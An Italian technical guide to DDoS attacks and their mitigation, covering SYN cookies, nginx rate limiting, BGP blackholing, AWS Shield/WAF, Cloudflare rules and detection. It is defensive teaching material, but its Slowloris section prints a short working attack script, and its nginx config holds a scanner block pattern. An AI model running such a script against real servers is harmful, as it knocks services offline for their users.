---
title: "Protezione DDoS"
slug: ddos-protezione
category: networking
tags: [ddos, sicurezza, mitigazione, cloudflare, aws-shield, rate-limiting, anycast]
search_keywords: [distributed denial of service, ddos attack, volumetric attack, protocol attack, application layer attack, l3 ddos, l4 ddos, l7 ddos, syn flood, udp flood, http flood, slowloris, amplification attack, reflection attack, anycast scrubbing, bgp blackholing, null routing, cdn ddos, aws shield, cloudflare ddos, rate limiting ddos, waf ddos, botnet, ip spoofing]
parent: networking/sicurezza/_index
related: [networking/sicurezza/firewall-waf, networking/api-gateway/rate-limiting, networking/fondamentali/tcpip]
official_docs: https://aws.amazon.com/shield/
status: reviewed
difficulty: advanced
last_updated: 2026-10-03
last_verified: 2026-10-03
---

# Protezione DDoS

## Panoramica

Un attacco DDoS (Distributed Denial of Service) cerca di rendere un servizio inaccessibile saturando le risorse (banda, CPU, connessioni) con traffico generato da migliaia di host compromessi (botnet). La difesa contro DDoS richiede una strategia a più livelli: mitigazione in-cloud (CDN, anycast scrubbing), protezione a livello di rete (BGP blackholing, rate limiting), e hardening applicativo (WAF, rate limiting L7, CAPTCHA).

Nessuna singola tecnologia protegge completamente da DDoS — la difesa efficace combina prevenzione, detection e risposta rapida.

## Prerequisiti

Questo argomento presuppone familiarità con:
- [TCP/IP](../fondamentali/tcpip.md) — SYN flood, UDP flood, amplification: questi attacchi sfruttano meccanismi TCP/UDP specifici
- [DNS](../fondamentali/dns.md) — gli attacchi di amplification usano spesso DNS come amplificatore
- [Rate Limiting](../api-gateway/rate-limiting.md) — il rate limiting è una delle tecniche di mitigazione DDoS a livello applicativo

Senza questi concetti, alcune sezioni potrebbero risultare difficili da contestualizzare.

## Concetti Chiave

### Classificazione degli Attacchi

| Tipo | Layer | Meccanismo | Esempio |
|------|-------|-----------|---------|
| **Volumetrico** | L3/L4 | Saturare la banda | UDP flood, ICMP flood, DNS amplification |
| **Protocol** | L4 | Esaurire risorse di sistema | SYN flood, Ping of Death, Smurf |
| **Applicativo** | L7 | Esaurire risorse applicative | HTTP flood, Slowloris, SSL exhaustion |

### Attacchi Volumetrici — Amplification

Gli attacchi più potenti usano **amplification**: il attaccante invia richieste piccole a server vulnerabili (DNS, NTP, memcached) con IP sorgente falsificato (spoofing) della vittima. Il server risponde con pacchetti molto più grandi alla vittima.

```
Attaccante                Amplifier (DNS)           Vittima
    │                          │                        │
    │── Query 100 byte ────────>│                        │
    │   (IP sorgente: vittima)  │                        │
    │                          │── Risposta 4000 byte ──>│
    │                          │   (amplification 40x)   │
    │                                                     │
    Botnet di 1000 host × 40x = attacco 40Gbps da 1Gbps traffico attaccante
```

**Amplification factors comuni:**
- DNS: 28-54x
- NTP monlist: 4000x
- memcached UDP: 51000x (!)
- SSDP: 30x

### SYN Flood — Come Funziona

```
Attaccante                              Server Vittima
    │                                        │
    │── SYN (IP spoofato) ───────────────────>│ Server crea half-open connection
    │── SYN (IP spoofato) ───────────────────>│ Slot SYN backlog occupato
    │── SYN (IP spoofato) ───────────────────>│ Slot SYN backlog occupato
    │ (migliaia al secondo)                   │ ... SYN backlog pieno
    │                                        │
    │                                  Nuove connessioni legittime
    │                                  vengono droppate (timeout del client)
```

**Mitigazione**: SYN cookies — il server non alloca stato finché il client non completa il 3-way handshake.

### Slowloris — Attacco Applicativo Silenzioso

```python
# Slowloris apre molte connessioni HTTP e le mantiene aperte
# inviando header incompleti lentissimamente, esaurendo
# il pool di connessioni del server senza generare traffico significativo

import socket, time

sockets = []
for _ in range(500):  # 500 connessioni "lente"
    s = socket.socket()
    s.connect(('target.com', 80))
    s.send(b"GET / HTTP/1.1\r\nHost: target.com\r\n")
    sockets.append(s)

while True:
    for s in sockets:
        s.send(b"X-Header: value\r\n")  # Header incompleto → connessione rimane aperta
    time.sleep(15)
```

**Mitigazione**: timeout aggressivi su header/body (Apache `mod_reqtimeout`, Nginx `client_header_timeout`), limite di connessioni per IP, reverse proxy con architettura a eventi (Nginx, CDN) davanti ai backend: bufferizza la richiesta completa prima di inoltrarla, quindi i worker applicativi non restano bloccati. I server a thread/process per connessione (Apache prefork/worker) sono i più vulnerabili.

!!! warning "Solo per test autorizzati"
    Lo script sopra è didattico: eseguirlo contro sistemi non propri è illegale.

### HTTP/2 Rapid Reset e attacchi L7 moderni

**HTTP/2 Rapid Reset** (CVE-2023-44487, ottobre 2023) sfrutta il multiplexing di HTTP/2: il client apre uno stream e lo annulla subito con `RST_STREAM`, ripetendo in massa. Il limite `MAX_CONCURRENT_STREAMS` non conta gli stream già resettati, quindi con poche connessioni si genera un enorme volume di richieste (record da decine di milioni di req/s) mentre il server spende CPU per ogni stream creato e annullato. Mitigazione: aggiornare web server/proxy alle versioni patchate (Nginx, Envoy, HAProxy, Go `net/http` ecc. hanno limiti sul tasso di reset), oppure far terminare HTTP/2 a una CDN/WAF che assorbe l'attacco. Gli attacchi L7 odierni sono tipicamente HTTP/2-3 su botnet di dispositivi IoT/VM compromesse, con richieste "legittime" che il solo rate limiting per IP non distingue: servono fingerprinting (JA3/JA4), bot score e challenge.

## Strategie di Mitigazione

### 1. Anycast Scrubbing (CDN/Cloud Provider)

La mitigazione più efficace per attacchi volumetrici: il traffico viene assorbito dalla rete distribuita del provider (Cloudflare, AWS Shield, Akamai) prima di raggiungere l'infrastruttura:

```
Internet
    │
    │ (Attacco 100Gbps)
    ▼
Cloudflare / AWS Shield Network
    ├── PoP New York: assorbe 30Gbps
    ├── PoP Londra: assorbe 25Gbps
    ├── PoP Frankfurt: assorbe 20Gbps
    ├── PoP Tokyo: assorbe 15Gbps
    └── altri PoP...
    │
    │ (Traffico lecito filtrato)
    ▼
Infrastruttura cliente
```

Le reti dei grandi provider hanno capacità di centinaia di Tbps, superiore ai record di attacco pubblici (multi-Tbps, fino a ordini di grandezza oltre 10 Tbps nel 2025): per un cliente tipico gli attacchi volumetrici sono assorbiti. Il meccanismo: con **anycast** lo stesso prefisso IP è annunciato da tutti i PoP, quindi ogni bot raggiunge il PoP più vicino e l'attacco si frammenta geograficamente invece di convergere su un solo link. Il traffico è poi filtrato (scrubbing) e solo quello lecito va all'origine.

### 2. BGP Blackholing / Null Routing

In caso di attacco massiccio, annunciare via BGP (RTBH, Remote Triggered Black Hole) che il target IP deve essere scartato dal provider upstream. Il traffico viene droppato sul bordo della rete dell'ISP, prima di saturare il tuo link. La community standard è `65535:666` (BLACKHOLE, RFC 7999), ma molti ISP ne definiscono una propria e accettano di solito solo prefissi /32 (IPv4) o /128 (IPv6).

```bash
# Comunica all'ISP di fare null routing via BGP community
# (verificare la community supportata dal proprio ISP)

# Esempio Juniper (schema semplificato): annuncia la route con community 65535:666 (RTBH)
set routing-options static route 203.0.113.100/32 discard

# Via BGP verso l'ISP (community RTBH)
set policy-options policy-statement blackhole-community term match from route-filter 203.0.113.100/32 exact
set policy-options policy-statement blackhole-community term match then community add RTBH accept
set policy-options community RTBH members 65535:666
```

!!! warning "Tradeoff del Blackholing"
    Il blackholing protegge l'infrastruttura ma rende irraggiungibile il target — è una "vittoria di Pirro". Usarlo solo quando il costo del downtime è inferiore al costo del servizio degradato durante l'attacco.

### 3. Rate Limiting e Filtri L7

```nginx
# Nginx — Protezione anti-DDoS L7
http {
    # Limita connessioni per IP
    limit_conn_zone $binary_remote_addr zone=conn_limit:10m;

    # Limita richieste per IP
    limit_req_zone $binary_remote_addr zone=req_limit:10m rate=30r/m;
    limit_req_status 429;   # default 503: 429 distingue il throttling da un errore backend
    limit_conn_status 429;

    # Blocca User-Agent di scanner noti (filtro banale: l'UA è falsificabile,
    # non ferma una botnet — riduce solo il rumore)
    map $http_user_agent $bad_bot {
        ~*(masscan|nikto|sqlmap|nmap) 1;
        default 0;
    }

    server {
        # Max 20 connessioni simultanee per IP
        limit_conn conn_limit 20;

        # Max 30 richieste al minuto con burst di 10
        limit_req zone=req_limit burst=10 nodelay;

        # Blocca bad bot
        if ($bad_bot = 1) {
            return 444;   # Chiude connessione senza risposta
        }

        # Timeout aggressivi contro Slowloris
        client_body_timeout   10s;
        client_header_timeout 10s;
        send_timeout          10s;
        keepalive_timeout     30s;

        # SYN cookies
        # (configurato in sysctl, non nginx)

        location / {
            # Override del limite a livello server (le direttive limit_req
            # in location sostituiscono quelle ereditate): burst più stretto
            limit_req zone=req_limit burst=5;
            proxy_pass http://backend;
        }
    }
}
```

```bash
# sysctl — Hardening kernel contro SYN flood
# /etc/sysctl.d/99-ddos-protection.conf

# SYN Cookies — protegge SYN backlog
net.ipv4.tcp_syncookies = 1

# Riduce il tempo di attesa per connessioni half-open
net.ipv4.tcp_synack_retries = 2

# Aumenta la dimensione del backlog SYN
net.ipv4.tcp_max_syn_backlog = 2048

# Abilita il filtraggio del percorso inverso (blocca IP spoofati)
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1

# Ignora broadcast ICMP (Smurf attack)
net.ipv4.icmp_echo_ignore_broadcasts = 1

# Rate limit delle risposte ICMP di errore: il valore è in ms tra due
# pacchetti (100 = max ~10/s), non pacchetti al secondo
net.ipv4.icmp_ratelimit = 100
```

```bash
# Applica
sysctl -p /etc/sysctl.d/99-ddos-protection.conf
```

!!! note "SYN cookies: quando scattano"
    Con `tcp_syncookies = 1` (default sulla maggior parte delle distro) il kernel usa i cookie solo quando il backlog è pieno, codificando lo stato nel numero di sequenza del SYN-ACK. Costo: si perdono alcune opzioni TCP (es. window scaling) per le connessioni nate in quella fase.

### 4. AWS Shield e WAF

AWS Shield **Standard** è incluso gratis su tutti gli account (protezione L3/L4 automatica). **Shield Advanced** è a pagamento (sottoscrizione annuale, costo fisso mensile elevato + data transfer) e aggiunge protezione L7 con WAF, accesso alla Shield Response Team (SRT, ex DRT), cost protection e mitigazione automatica L7.

```bash
# Sottoscrivere Shield Advanced (impegno annuale, a livello account)
aws shield create-subscription

# Autorizza la SRT ad accedere ai log WAF/access
aws shield associate-drt-log-bucket \
  --log-bucket my-access-logs-bucket

# Abilita protezione Shield Advanced su CloudFront distribution
aws shield create-protection \
  --name "prod-cloudfront" \
  --resource-arn arn:aws:cloudfront::123456789:distribution/ABCDEF

# WAF: blocklist IP statica (da referenziare in una regola IPSetReferenceStatement)
# Nota: per scope CLOUDFRONT la regione deve essere us-east-1
aws wafv2 create-ip-set \
  --region us-east-1 \
  --name block-ips \
  --scope CLOUDFRONT \
  --ip-address-version IPV4 \
  --addresses "203.0.113.0/24"

# Rate limiting: max 2000 req/5min per IP
aws wafv2 create-web-acl \
  --region us-east-1 \
  --name "ddos-protection" \
  --scope CLOUDFRONT \
  --default-action Allow={} \
  --visibility-config SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=ddos-protection \
  --rules '[{
    "Name": "IPRateLimit",
    "Priority": 1,
    "Statement": {
      "RateBasedStatement": {
        "Limit": 2000,
        "AggregateKeyType": "IP"
      }
    },
    "Action": {"Block": {}},
    "VisibilityConfig": {
      "SampledRequestsEnabled": true,
      "CloudWatchMetricsEnabled": true,
      "MetricName": "IPRateLimit"
    }
  }]'
```

### 5. Cloudflare — Configurazione Anti-DDoS

La protezione DDoS L3/L4/L7 di Cloudflare è attiva di default su tutti i piani (ruleset *managed*); le regole sotto servono ad **alterare sensibilità/azione** di singole regole. Gli ID sono quelli dei managed ruleset pubblici (verificarli con l'API `rulesets` prima dell'uso). La sintassi a blocchi `rules { }` è del provider Terraform v4; dal v5 `rules` è un attributo lista (`rules = [{ ... }]`).

```hcl
# Cloudflare DDoS override (via Terraform, provider v4)
resource "cloudflare_ruleset" "ddos_l7" {
  zone_id     = var.zone_id
  name        = "DDoS L7 Override"
  description = "DDoS L7 protection rules"
  kind        = "zone"
  phase       = "ddos_l7"

  rules {
    action = "execute"
    action_parameters {
      id = "4d21379b4f9f4bb088e0729962c8b3cf"
      overrides {
        rules {
          id                = "fdfdac75430c4c47a959592f0aa5e68a"
          sensitivity_level = "high"
          action            = "block"
        }
      }
    }
    expression  = "true"
    description = "Execute DDoS L7 managed ruleset"
    enabled     = true
  }
}

# Bot Management Rule (richiede Bot Management, piano Enterprise)
resource "cloudflare_ruleset" "bot_management" {
  zone_id = var.zone_id
  name    = "Bot Management"
  kind    = "zone"
  phase   = "http_request_firewall_custom"

  rules {
    action = "challenge"   # CAPTCHA challenge
    expression  = "(cf.bot_management.score lt 30) and not (cf.bot_management.verified_bot)"
    description = "Challenge low bot score"
    enabled     = true
  }
}
```

## Detection e Monitoraggio

### Segnali di un Attacco in Corso

```bash
# Traffico di rete anomalo
iftop -i eth0 -n    # Traffico in tempo reale per connessione
nethogs eth0        # Traffico per processo

# Connessioni TCP in stato SYN_RECV (SYN flood)
ss -n state syn-recv | wc -l
# Normale: < 100 | In attacco: migliaia

# Connessioni per IP (top offender)
ss -n | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -20

# Saturazione CPU Nginx
top -p $(pgrep -d, nginx)

# Analisi access log — richieste per IP ultimo minuto
awk -v d="$(date -d '1 minute ago' '+%d/%b/%Y:%H:%M')" '$4 > "["d' /var/log/nginx/access.log \
  | awk '{print $1}' | sort | uniq -c | sort -rn | head -20
```

### Alert con Prometheus + Grafana

```yaml
# alerting rules
groups:
- name: ddos
  rules:
  - alert: HighConnectionsPerIP
    # Richiede una metrica con label per client IP (es. da log parsing con
    # mtail/Vector/Loki): NON esiste nell'exporter nginx standard e ha
    # cardinalità alta — limitare a top-N o fare il calcolo nei log.
    expr: |
      sum by (remote_addr) (
        rate(nginx_http_requests_total[1m])
      ) > 100
    for: 1m
    annotations:
      summary: "IP {{ $labels.remote_addr }} fa {{ $value }} req/s"

  - alert: HighErrorRate
    expr: |
      sum(rate(nginx_http_requests_total{status=~"5.."}[5m])) /
      sum(rate(nginx_http_requests_total[5m])) > 0.1
    for: 2m
    annotations:
      summary: "Error rate > 10% — possibile attacco L7"

  - alert: BandwidthAnomaly
    expr: |
      rate(node_network_receive_bytes_total{device="eth0"}[5m]) > 1e9
    annotations:
      summary: "Traffico in entrata > 1Gbps — possibile attacco volumetrico"
```

## Best Practices

- **CDN sempre davanti**: Cloudflare, AWS CloudFront o simili assorbono attacchi volumetrici prima che raggiungano la tua infrastruttura — il costo è inferiore al downtime
- **Nascondere l'IP origine**: se l'attaccante conosce il tuo IP diretto (non quello della CDN), la CDN non protegge — usare IP filtering per accettare connessioni solo dalla CDN
- **Rate limiting a più livelli**: CDN + WAF + applicativo — ogni livello filtra una parte del traffico malevolo
- **SYN cookies sempre attivi**: costo zero, protezione immediata contro SYN flood
- **Runbook per DDoS**: documentare la procedura di risposta — non improvvisare durante l'attacco
- **Test regolari**: simulare attacchi in ambienti di staging per verificare che la protezione funzioni prima che sia necessaria

## Troubleshooting

| Sintomo | Tipo Attacco | Azione Immediata |
|---------|-------------|-----------------|
| Alta banda, pochi IP | Amplification volumetrico | BGP blackholing, contatta ISP/CDN |
| Molte conn. in SYN_RECV | SYN flood | Verificare SYN cookies attivi |
| CPU alta, poche richieste | Slowloris / SSL exhaustion | Timeout aggressivi, CAPTCHA |
| CPU media, molte richieste | HTTP flood L7 | Rate limiting, bot challenge |
| Solo un endpoint colpito | DDoS applicativo mirato | WAF rule specifica, aumentare cache |

### Scenario 1 — SYN flood: connessioni legittime rifiutate

**Sintomo**: i client ricevono timeout (i SYN scartati non ricevono risposta; `ECONNREFUSED` indica invece una porta chiusa o un RST); `ss` mostra migliaia di socket in `SYN_RECV`.

**Causa**: il SYN backlog (coda delle connessioni half-open) è saturo di SYN con IP spoofato che non completeranno mai l'handshake.

**Soluzione**: attivare i SYN cookies (il kernel non alloca stato finché l'ACK finale non arriva), ridurre i retry SYN-ACK e aumentare il backlog.

```bash
ss -n state syn-recv | wc -l
sysctl net.ipv4.tcp_syncookies
sysctl -w net.ipv4.tcp_syncookies=1
sysctl -w net.ipv4.tcp_synack_retries=2
sysctl -w net.ipv4.tcp_max_syn_backlog=4096
# Verifica drop del backlog
nstat -az TcpExtListenOverflows TcpExtTCPReqQFullDrop
```

### Scenario 2 — Slowloris: worker esauriti con CPU e banda basse

**Sintomo**: il sito non risponde ma traffico e CPU sono normali; molte connessioni `ESTABLISHED` da pochi IP, con richieste mai complete.

**Causa**: header HTTP inviati goccia a goccia tengono occupati i worker/connessioni del server fino all'esaurimento del pool.

**Soluzione**: timeout stretti su header/body, limite di connessioni per IP e reverse proxy (Nginx/CDN) davanti ai worker, che bufferizza le richieste complete prima di inoltrarle.

```bash
# Top IP per connessioni sulla porta 443
ss -Htn state established '( sport = :443 )' | awk '{print $4}' | cut -d: -f1 | sort | uniq -c | sort -rn | head
# Blocco temporaneo di un offender
iptables -A INPUT -s 198.51.100.7 -j DROP
# Verifica timeout Nginx attivi
nginx -T 2>/dev/null | grep -E 'client_(header|body)_timeout|limit_conn'
```

### Scenario 3 — Attacco bypassa la CDN colpendo l'IP origine

**Sintomo**: la CDN mostra traffico normale ma l'origin è saturo; i log origin riportano richieste con `Host` corretto da IP non CDN.

**Causa**: l'IP origine è noto (record DNS storici, certificati in Certificate Transparency, email header) e raggiungibile direttamente, quindi la protezione CDN viene aggirata.

**Soluzione**: accettare traffico sull'origin solo dai range della CDN (o via tunnel/mTLS) e, se l'IP è esposto, cambiarlo.

```bash
# Consenti solo i range Cloudflare (lista ufficiale; aggiungere anche /ips-v6
# e rieseguire periodicamente: i range cambiano). Alternative più robuste:
# Authenticated Origin Pulls (mTLS) o Cloudflare Tunnel (nessuna porta esposta)
for ip in $(curl -s https://www.cloudflare.com/ips-v4); do
  ufw allow from "$ip" to any port 443 proto tcp
done
ufw deny 443/tcp
# Controlla se l'origin risponde direttamente
curl -sk --resolve example.com:443:203.0.113.10 https://example.com -o /dev/null -w '%{http_code}\n'
```

### Scenario 4 — Rate limiting blocca utenti legittimi (falsi positivi)

**Sintomo**: utenti dietro NAT aziendale o carrier-grade NAT ricevono `429`/`503`; picchi di traffico lecito (campagne, release) vengono bloccati.

**Causa**: il limite per IP raggruppa molti utenti dietro lo stesso indirizzo pubblico; le soglie fisse non tengono conto dei picchi legittimi.

**Soluzione**: aumentare `burst`, chiavare il limite su identità (API key, cookie di sessione) invece che sul solo IP, mettere in allowlist i range noti e partire in modalità *count/log* prima di bloccare.

```bash
# Quante richieste sono state rifiutate da Nginx
grep -c ' 503 ' /var/log/nginx/access.log
grep 'limiting requests' /var/log/nginx/error.log | tail -20
# AWS WAF: regola rate-based in modalità Count per tarare la soglia
aws wafv2 get-sampled-requests --web-acl-arn "$ACL_ARN" \
  --rule-metric-name IPRateLimit --scope CLOUDFRONT \
  --time-window StartTime=2026-10-03T08:00:00Z,EndTime=2026-10-03T09:00:00Z --max-items 50
```

## Relazioni

??? info "Firewall e WAF — Protezione L3-L7"
    Il WAF è il componente di filtraggio principale per attacchi L7.

    **Approfondimento →** [Firewall e WAF](firewall-waf.md)

??? info "Rate Limiting — Throttling delle API"
    Il rate limiting è la prima linea di difesa contro attacchi applicativi.

    **Approfondimento →** [Rate Limiting](../api-gateway/rate-limiting.md)

## Riferimenti

- [AWS Shield — DDoS Protection](https://aws.amazon.com/shield/)
- [Cloudflare DDoS Protection](https://www.cloudflare.com/ddos/)
- [NIST — DDoS Guidance](https://www.cisa.gov/sites/default/files/publications/understanding-and-responding-to-ddos-attacks_508c.pdf)
- [Nginx Anti-DDoS](https://www.nginx.com/blog/mitigating-ddos-attacks-with-nginx-and-nginx-plus/)
